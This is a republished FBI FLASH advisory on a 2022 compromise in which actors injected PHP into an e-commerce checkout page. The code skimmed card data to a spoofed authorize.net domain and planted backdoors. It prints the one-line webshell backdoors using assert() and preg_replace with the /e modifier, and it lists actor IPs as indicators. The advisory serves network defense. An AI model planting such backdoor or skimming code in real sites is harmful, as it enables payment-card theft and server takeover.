---
layout: default
title: . 5/16/2022 - Cyber Actors Scrape Credit Card Data from US Business’ Online Checkout Page and Maintain Persistence by Injecting Malicious PHP Code  
parent: FBI 
nav_order: 978071599 
---
<style>
.dont-break-out {
  /* These are technically the same, but use both */
  overflow-wrap: break-word;
  word-wrap: break-word;

  -ms-word-break: break-all;
  /* This is the dangerous one in WebKit, as it breaks things wherever */
  word-break: break-all;
  /* Instead use this non-standard one: */
  word-break: break-word;
}
</style>

<div class="dont-break-out" markdown="1">
This is the mobile-friendly web version of the [original article](https://www.aha.org/system/files/media/file/2022/05/fbi-flash-tlp-white-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-5-16-22.pdf).

<img src="https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code.png">

### 16 May 2022
{: .no_toc }
#### Flash Number
{: .no_toc }
### MC-000170-MW 
{: .no_toc }  

1. TOC
{:toc}

The following information is being provided by the FBI, with no guarantees or warranties, for potential use at the sole discretion of recipients in order to protect against cyber threats. This data is provided to help cyber security professionals and system administrators’ guard against the persistent malicious actions of cyber actors. This FLASH was coordinated with DHS-CISA.

This FLASH has been released TLP WHITE. Subject to standard copyright rules, TLP WHITE information may be distributed without restriction.

**WE NEED YOUR HELP!** If you identify any suspicious activity within your enterprise or have related information, please contact your local FBI Cyber Squad immediately with respect to the procedures outlined in the Reporting Notice section of this message.

***

# Cyber Actors Scrape Credit Card Data from US Business’ Online Checkout Page and Maintain Persistence by Injecting Malicious PHP Code    

## Summary

As of January 2022, unidentified cyber actors unlawfully scraped credit card data from a US business by injecting malicious PHP Hypertext Preprocessor (PHP) code into the business’ online checkout page and sending the scraped data to an actor-controlled server that spoofed a legitimate card processing server. The unidentified cyber actors also established backdoor access to the victim’s system by modifying two files within the checkout page. The FBI has identified and is sharing new indicators of compromise (IOCs), which may assist in network defense.

***

## Technical Details

Unidentified cyber actors began targeting a US business in September 2020 from three Internet protocol (IP) addresses: 80.249.207.19, 80.82.64.211, and 80.249.206.197. The actors inserted malicious PHP code into the business’s customized online checkout page, checkout.php, by altering the associated TempOrders.php file. The checkout page was modified with the following include()statement:

![Figure 1: Example include() statement](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-fig-1.png)
*Figure 1: Example include() statement*

include()statements allow developers to import PHP code from one file into another file, which decreases the number of files developers must modify to update their code. Malicious actors exploited this capability to insert the contents of TempOrders.php into the checkout cart_required_files.php file. This cart_required_files.php file contained a require_once() statement that is nearly identical to the include() statement, except that if the identified file cannot be found, a warning is shown and program execution continues.

![Figure 2: Example “require_once” function](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-fig-2.png)
*[Figure 2: Example “require_once” function]*

As of January 2022, the unidentified cyber actors used the require_once() function to call and execute the TempOrders.php file, which contained code used to scrape and exfiltrate customer data from the US business’ shopping cart to a victim-specific PHP file “file_name.php”: 

![Figure 3: Example code from TempOrders.php file identified on victim host](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-fig-3.png)
*Figure 3: Example code from TempOrders.php file identified on victim host*

The malicious code posts the customer’s payment information to a spoofed card processing domain, http://authorizen[.]net/, where the ‘n’ is added to impersonate or spoof http://authorize[.]net/, a legitimate card processing company’s domain. The unidentified cyber actors also established backdoor access to the business’ system by modifying two files.

First, the actors established a rudimentary back door by inserting the assert($_REQUEST['login']) function. This function is designed for debugging and when called executes code submitted as the HTTP request parameter “login”. Upon execution, the system downloads a fully functional P.A.S. webshell onto the affected company’s webserver

![Figure 4: Example of code used to establish a rudimentary back door](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-fig-4.png)
*Figure 4: Example of code used to establish a rudimentary back door*

Second, the actors inserted the PHP regular expression @preg_replace("/f/e",$_GET['u'],"fengjiao"), which is designed to insert and execute PHP code submitted as an HTTP request variable named “u”. 

![Figure 5: Example of HTTP request used to execute PHP code and enable the back door](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-fig-5.png)
*Figure 5: Example of HTTP request used to execute PHP code and enable the back door*

Using the described techniques, the actors downloaded two PHP Webshells, P.A.S. and b374, which were leveraged as backdoors for further exploitation.

***

## Indicators
The following Internet Protocol (IP) addresses and Uniform Resource Locators (URLs) were used
during vulnerability exploitation and/or data exfiltration:

![Table-1](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-table-1.png)

![Table-2](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-table-2.png)

![Table-3](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-table-3.png)

PHP Code: The PHP code below is an example of how the unidentified cyber actors modified the target company’s code. The first three lines, beginning with “$this”, are actual code from the company’s shopping cart, and the remaining lines, beginning with “curl” were added by the actors.

![Figure 6: Example of code used to modify the target’s shopping cart](https://statics.bsafes.com/images/publications/flash-2022-0516-cyber-actors-scrape-credit-card-data-from-us-business-online-checkout-page-and-maintain-persistence-by-injecting-malicious-php-code-fig-6.png)
*Figure 6: Example of code used to modify the target’s shopping cart*


***

## Recommended Mitigations:
- Update and patch all systems, to include operating systems, software, and any thirdparty code running as part of your website.
- Change default login credentials on all systems.
- Monitor requests performed against your e-commerce environment to identify possible malicious activity.
- Segregate and segment network systems to limit how easily cyber criminals can move from one to another.
- Secure all websites transferring sensitive information by using secure socket layer (SSL) protocol.
- Install third-party software/hardware from trusted sources. Coordinate with the manufacturer to ensure their security protocols prevent unauthorized access to data they store and/or process.
- Patch all systems for critical vulnerabilities, prioritizing timely patching of internetconnected servers for known vulnerabilities and software processing internet data, such as web browsers, browser plugins, and document readers.
- Actively scan and monitor web logs and web applications for unauthorized access, modification, and anomalous activities.
- Strengthen credential requirements and implement multifactor authentication to protect individual accounts.
- Conduct regular backups to reduce recovery time in the event of a compromise or cyber intrusion.
- Maintain an updated Incident Response Plan addressing cyber threat response.

***

## Reporting Notice
The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office. With regards to specific information that appears in this communication; the context, individual indicators, particularly those of a non- deterministic or ephemeral nature (such as filenames or IP addresses), may not be indicative of a compromise. Indicators should always be evaluated in light of your complete information security situation.

Field office contacts can be identified at www.fbi.gov/contact-us/field-offices. When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact.

***

## Administrative Note
This product is marked TLP:WHITE. Subject to standard copyright rules, the information in this product may be shared without restriction.

<div style="background-color:lightblue; padding:20px" markdown="1">
<h3 style="text-align:center">Your Feedback on the Value of this Product Is Critical</h3>
Was this product of value to your organization? Was the content clear and concise? Your comments are very important to us and can be submitted anonymously. Please take a moment to complete the survey at the link below. Feedback should be specific to your experience with our written products to enable the FBI to make quick and continuous improvements to such products. Feedback may be submitted online here: https://www.ic3.gov/PIFSurvey

Please note that this survey is for feedback on content and value only. Reporting of technical information regarding FLASH reports must be submitted through your FBI Field Office .
</div>
</div>
